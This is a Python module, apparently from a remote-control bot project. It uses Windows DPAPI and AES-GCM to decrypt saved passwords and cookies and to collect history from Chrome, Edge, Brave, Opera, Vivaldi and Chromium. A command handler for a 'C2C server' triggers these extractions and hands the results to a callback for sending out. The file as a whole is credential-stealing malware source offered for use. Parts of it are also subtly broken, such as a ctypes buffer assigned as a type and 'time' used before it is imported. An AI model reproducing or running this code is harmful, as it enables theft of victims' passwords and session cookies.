#!/usr/bin/env python3
"""
Windows DPAPI (Data Protection API) Integration Module
Ported from control_computer/bot.py - for decrypting browser data
"""

import os
import json
import base64
import sqlite3
import tempfile
import shutil
import logging
from typing import Optional, Dict, Any, List, Tuple
from pathlib import Path
from ctypes import Structure, POINTER, wintypes, windll, byref, c_char, c_buffer, create_string_buffer
from Crypto.Cipher import AES


# Windows API structures
class DATA_BLOB(Structure):
    """Windows DATA_BLOB structure for DPAPI"""
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]


class DPAPICrypto:
    """Windows DPAPI crypto operations for browser data decryption"""
    
    def __init__(self):
        """Initialize DPAPI crypto handler"""
        self.logger = logging.getLogger(__name__)
        
        # Check if running on Windows
        if os.name != 'nt':
            self.logger.warning("DPAPI only available on Windows")
            self.available = False
        else:
            self.available = True
            
        # Browser paths
        self.browser_paths = {
            'Chrome': os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data'),
            'Edge': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'),
            'Chromium': os.path.expanduser(r'~\AppData\Local\Chromium\User Data'),
            'Opera': os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable'),
            'Brave': os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data'),
            'Vivaldi': os.path.expanduser(r'~\AppData\Local\Vivaldi\User Data')
        }
        
    def decrypt_data(self, encrypted_data: bytes, entropy: bytes = b'') -> Optional[bytes]:
        """
        Decrypt data using Windows DPAPI
        
        Args:
            encrypted_data: Encrypted data bytes
            entropy: Optional entropy for additional security
            
        Returns:
            Decrypted data or None if failed
        """
        if not self.available:
            self.logger.error("DPAPI not available on this platform")
            return None
            
        try:
            # Create input blob
            blob_in = DATA_BLOB()
            blob_in.pbData = c_char * len(encrypted_data)
            blob_in.cbData = len(encrypted_data)
            
            # Create output blob
            blob_out = DATA_BLOB()
            
            # Create entropy blob if provided
            entropy_blob = DATA_BLOB()
            entropy_ptr = None
            if entropy:
                entropy_blob.pbData = c_char * len(entropy)
                entropy_blob.cbData = len(entropy)
                entropy_ptr = byref(entropy_blob)
                
            # Call CryptUnprotectData
            result = windll.crypt32.CryptUnprotectData(
                byref(blob_in),     # pDataIn
                None,               # ppszDataDescr
                entropy_ptr,        # pOptionalEntropy
                None,               # pvReserved
                None,               # pPromptStruct
                0,                  # dwFlags
                byref(blob_out)     # pDataOut
            )
            
            if result:
                # Extract decrypted data
                decrypted_size = blob_out.cbData
                decrypted_data = create_string_buffer(decrypted_size)
                windll.kernel32.RtlMoveMemory(decrypted_data, blob_out.pbData, decrypted_size)
                
                # Free memory
                windll.kernel32.LocalFree(blob_out.pbData)
                
                return decrypted_data.raw
            else:
                error_code = windll.kernel32.GetLastError()
                self.logger.error(f"CryptUnprotectData failed with error: {error_code}")
                return None
                
        except Exception as e:
            self.logger.error(f"DPAPI decryption error: {e}")
            return None
            
    def get_browser_master_key(self, browser: str) -> Optional[bytes]:
        """
        Get browser master key for AES decryption
        
        Args:
            browser: Browser name ('Chrome', 'Edge', etc.)
            
        Returns:
            Master key bytes or None if failed
        """
        try:
            if browser not in self.browser_paths:
                self.logger.error(f"Unknown browser: {browser}")
                return None
                
            browser_path = self.browser_paths[browser]
            local_state_path = os.path.join(browser_path, "Local State")
            
            if not os.path.exists(local_state_path):
                self.logger.warning(f"Browser Local State not found: {local_state_path}")
                return None
                
            # Read Local State file
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                
            # Extract encrypted key
            encrypted_key_b64 = local_state.get('os_crypt', {}).get('encrypted_key')
            if not encrypted_key_b64:
                self.logger.error("No encrypted key found in Local State")
                return None
                
            # Decode and decrypt master key
            encrypted_key = base64.b64decode(encrypted_key_b64)
            
            # Remove DPAPI prefix if present
            if encrypted_key.startswith(b'DPAPI'):
                encrypted_key = encrypted_key[5:]
                
            # Decrypt using DPAPI
            master_key = self.decrypt_data(encrypted_key)
            
            if master_key:
                self.logger.info(f"Successfully extracted master key for {browser}")
                return master_key
            else:
                self.logger.error(f"Failed to decrypt master key for {browser}")
                return None
                
        except Exception as e:
            self.logger.error(f"Error getting browser master key for {browser}: {e}")
            return None
            
    def decrypt_browser_value(self, encrypted_value: bytes, master_key: bytes) -> Optional[str]:
        """
        Decrypt browser saved value (password/cookie) using master key
        
        Args:
            encrypted_value: Encrypted value from browser database
            master_key: Browser master key
            
        Returns:
            Decrypted string value or None if failed
        """
        try:
            if not encrypted_value or not master_key:
                return None
                
            # Check if it's AES encrypted (v10+)
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                # Extract IV and encrypted data
                iv = encrypted_value[3:15]  # 12 bytes IV
                encrypted_data = encrypted_value[15:]
                
                # Decrypt using AES-GCM
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                try:
                    decrypted = cipher.decrypt_and_verify(encrypted_data[:-16], encrypted_data[-16:])
                    return decrypted.decode('utf-8', errors='ignore')
                except Exception:
                    # Try without verification (some browsers don't use authentication tag)
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                    try:
                        decrypted = cipher.decrypt(encrypted_data)
                        return decrypted.decode('utf-8', errors='ignore')
                    except Exception:
                        return None
                        
            else:
                # Older encryption method - use DPAPI directly
                decrypted = self.decrypt_data(encrypted_value)
                if decrypted:
                    return decrypted.decode('utf-8', errors='ignore')
                return None
                
        except Exception as e:
            self.logger.error(f"Error decrypting browser value: {e}")
            return None
            
    def create_temp_db_copy(self, source_path: str) -> Optional[str]:
        """
        Create temporary copy of locked database file
        
        Args:
            source_path: Path to source database
            
        Returns:
            Path to temporary copy or None if failed
        """
        try:
            if not os.path.exists(source_path):
                return None
                
            # Create temporary file
            temp_dir = tempfile.gettempdir()
            temp_name = f"temp_db_{os.getpid()}_{int(time.time())}.db"
            temp_path = os.path.join(temp_dir, temp_name)
            
            # Copy database
            shutil.copy2(source_path, temp_path)
            
            return temp_path
            
        except Exception as e:
            self.logger.error(f"Error creating temp database copy: {e}")
            return None


class BrowserDataExtractor:
    """Extract and decrypt browser stored data"""
    
    def __init__(self, callback: Optional[callable] = None):
        """
        Initialize browser data extractor
        
        Args:
            callback: Function to send extracted data
        """
        self.dpapi = DPAPICrypto()
        self.callback = callback
        self.logger = logging.getLogger(__name__)
        
    def extract_passwords(self, browsers: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Extract saved passwords from browsers
        
        Args:
            browsers: List of browsers to extract from (None for all)
            
        Returns:
            Dictionary with extraction results
        """
        if browsers is None:
            browsers = list(self.dpapi.browser_paths.keys())
            
        results = {
            'success': True,
            'message': 'Password extraction completed',
            'browsers': {},
            'total_passwords': 0,
            'errors': []
        }
        
        for browser in browsers:
            try:
                browser_result = self._extract_browser_passwords(browser)
                results['browsers'][browser] = browser_result
                results['total_passwords'] += browser_result.get('password_count', 0)
                
            except Exception as e:
                error_msg = f"Error extracting from {browser}: {str(e)}"
                results['errors'].append(error_msg)
                self.logger.error(error_msg)
                
        if self.callback:
            self._send_results('passwords', results)
            
        return results
        
    def extract_cookies(self, browsers: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Extract cookies from browsers
        
        Args:
            browsers: List of browsers to extract from (None for all)
            
        Returns:
            Dictionary with extraction results
        """
        if browsers is None:
            browsers = list(self.dpapi.browser_paths.keys())
            
        results = {
            'success': True,
            'message': 'Cookie extraction completed',
            'browsers': {},
            'total_cookies': 0,
            'errors': []
        }
        
        for browser in browsers:
            try:
                browser_result = self._extract_browser_cookies(browser)
                results['browsers'][browser] = browser_result
                results['total_cookies'] += browser_result.get('cookie_count', 0)
                
            except Exception as e:
                error_msg = f"Error extracting cookies from {browser}: {str(e)}"
                results['errors'].append(error_msg)
                self.logger.error(error_msg)
                
        if self.callback:
            self._send_results('cookies', results)
            
        return results
        
    def extract_history(self, browsers: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Extract browsing history from browsers
        
        Args:
            browsers: List of browsers to extract from (None for all)
            
        Returns:
            Dictionary with extraction results
        """
        if browsers is None:
            browsers = list(self.dpapi.browser_paths.keys())
            
        results = {
            'success': True,
            'message': 'History extraction completed',
            'browsers': {},
            'total_entries': 0,
            'errors': []
        }
        
        for browser in browsers:
            try:
                browser_result = self._extract_browser_history(browser)
                results['browsers'][browser] = browser_result
                results['total_entries'] += browser_result.get('history_count', 0)
                
            except Exception as e:
                error_msg = f"Error extracting history from {browser}: {str(e)}"
                results['errors'].append(error_msg)
                self.logger.error(error_msg)
                
        if self.callback:
            self._send_results('history', results)
            
        return results
        
    def _extract_browser_passwords(self, browser: str) -> Dict[str, Any]:
        """Extract passwords from specific browser"""
        result = {
            'available': False,
            'password_count': 0,
            'passwords': [],
            'error': None
        }
        
        try:
            # Check if browser is available
            browser_path = self.dpapi.browser_paths.get(browser)
            if not browser_path or not os.path.exists(browser_path):
                result['error'] = 'Browser not found'
                return result
                
            # Get master key
            master_key = self.dpapi.get_browser_master_key(browser)
            if not master_key:
                result['error'] = 'Could not get master key'
                return result
                
            result['available'] = True
            
            # Find login database
            login_db_path = os.path.join(browser_path, 'Default', 'Login Data')
            if not os.path.exists(login_db_path):
                # Try other profile names
                profiles = ['Profile 1', 'Profile 2', 'Guest Profile']
                for profile in profiles:
                    test_path = os.path.join(browser_path, profile, 'Login Data')
                    if os.path.exists(test_path):
                        login_db_path = test_path
                        break
                else:
                    result['error'] = 'Login database not found'
                    return result
                    
            # Create temporary copy
            temp_db = self.dpapi.create_temp_db_copy(login_db_path)
            if not temp_db:
                result['error'] = 'Could not create database copy'
                return result
                
            try:
                # Query passwords
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT origin_url, username_value, password_value 
                    FROM logins 
                    WHERE blacklisted_by_user = 0
                """)
                
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    
                    if encrypted_password:
                        password = self.dpapi.decrypt_browser_value(encrypted_password, master_key)
                        if password:
                            result['passwords'].append({
                                'url': url,
                                'username': username,
                                'password': password
                            })
                            
                result['password_count'] = len(result['passwords'])
                
                conn.close()
                
            finally:
                # Clean up temp file
                try:
                    os.remove(temp_db)
                except:
                    pass
                    
        except Exception as e:
            result['error'] = str(e)
            
        return result
        
    def _extract_browser_cookies(self, browser: str) -> Dict[str, Any]:
        """Extract cookies from specific browser"""
        result = {
            'available': False,
            'cookie_count': 0,
            'cookies': [],
            'error': None
        }
        
        try:
            # Similar implementation to passwords but for cookies
            browser_path = self.dpapi.browser_paths.get(browser)
            if not browser_path or not os.path.exists(browser_path):
                result['error'] = 'Browser not found'
                return result
                
            master_key = self.dpapi.get_browser_master_key(browser)
            if not master_key:
                result['error'] = 'Could not get master key'
                return result
                
            result['available'] = True
            
            # Find cookies database
            cookies_db_path = os.path.join(browser_path, 'Default', 'Network', 'Cookies')
            if not os.path.exists(cookies_db_path):
                cookies_db_path = os.path.join(browser_path, 'Default', 'Cookies')
                
            if not os.path.exists(cookies_db_path):
                result['error'] = 'Cookies database not found'
                return result
                
            temp_db = self.dpapi.create_temp_db_copy(cookies_db_path)
            if not temp_db:
                result['error'] = 'Could not create database copy'
                return result
                
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Query for encrypted cookies only
                cursor.execute("""
                    SELECT host_key, name, encrypted_value, path 
                    FROM cookies 
                    WHERE encrypted_value IS NOT NULL AND encrypted_value != ''
                    LIMIT 1000
                """)
                
                for row in cursor.fetchall():
                    host, name, encrypted_value, path = row
                    
                    if encrypted_value:
                        value = self.dpapi.decrypt_browser_value(encrypted_value, master_key)
                        if value:
                            result['cookies'].append({
                                'host': host,
                                'name': name,
                                'value': value,
                                'path': path
                            })
                            
                result['cookie_count'] = len(result['cookies'])
                conn.close()
                
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
                    
        except Exception as e:
            result['error'] = str(e)
            
        return result
        
    def _extract_browser_history(self, browser: str) -> Dict[str, Any]:
        """Extract history from specific browser"""
        result = {
            'available': False,
            'history_count': 0,
            'history': [],
            'error': None
        }
        
        try:
            browser_path = self.dpapi.browser_paths.get(browser)
            if not browser_path or not os.path.exists(browser_path):
                result['error'] = 'Browser not found'
                return result
                
            result['available'] = True
            
            # Find history database
            history_db_path = os.path.join(browser_path, 'Default', 'History')
            if not os.path.exists(history_db_path):
                result['error'] = 'History database not found'
                return result
                
            temp_db = self.dpapi.create_temp_db_copy(history_db_path)
            if not temp_db:
                result['error'] = 'Could not create database copy'
                return result
                
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT url, title, visit_count, last_visit_time 
                    FROM urls 
                    ORDER BY last_visit_time DESC 
                    LIMIT 1000
                """)
                
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit = row
                    result['history'].append({
                        'url': url,
                        'title': title or '',
                        'visit_count': visit_count,
                        'last_visit': last_visit
                    })
                    
                result['history_count'] = len(result['history'])
                conn.close()
                
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
                    
        except Exception as e:
            result['error'] = str(e)
            
        return result
        
    def _send_results(self, data_type: str, results: Dict[str, Any]) -> None:
        """Send extraction results via callback"""
        try:
            if self.callback:
                callback_data = {
                    'type': f'browser_{data_type}',
                    'timestamp': time.time(),
                    'data': results
                }
                self.callback(callback_data)
                
        except Exception as e:
            self.logger.error(f"Error sending {data_type} results: {e}")


# Example integration with C2C server
def integrate_with_c2c_server():
    """Example of how to integrate with C2C server"""
    
    def send_to_client(data):
        """Send data to connected client"""
        print(f"Sending browser data: {data['type']}")
        
    # Create browser extractor
    extractor = BrowserDataExtractor(callback=send_to_client)
    
    # Commands that can be called from server
    def handle_dpapi_command(command: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Handle DPAPI commands from C2C server"""
        params = params or {}
        
        if command == 'extract_passwords':
            browsers = params.get('browsers')
            return extractor.extract_passwords(browsers)
            
        elif command == 'extract_cookies':
            browsers = params.get('browsers')
            return extractor.extract_cookies(browsers)
            
        elif command == 'extract_history':
            browsers = params.get('browsers')
            return extractor.extract_history(browsers)
            
        elif command == 'get_browsers':
            return {
                'success': True,
                'browsers': list(extractor.dpapi.browser_paths.keys()),
                'available': extractor.dpapi.available
            }
            
        else:
            return {
                'success': False,
                'message': f'Unknown command: {command}'
            }
    
    return handle_dpapi_command


if __name__ == "__main__":
    # Test the DPAPI module
    import time
    
    def test_callback(data):
        print(f"Extracted {data['type']}: {len(data['data'])} items")
    
    # Create and test extractor
    extractor = BrowserDataExtractor(callback=test_callback)
    
    print("Testing DPAPI browser data extraction...")
    
    # Test password extraction
    print("\nExtracting passwords...")
    password_results = extractor.extract_passwords(['Chrome'])
    print(f"Password results: {password_results}")
    
    # Test cookie extraction
    print("\nExtracting cookies...")
    cookie_results = extractor.extract_cookies(['Chrome'])
    print(f"Cookie results: {cookie_results}")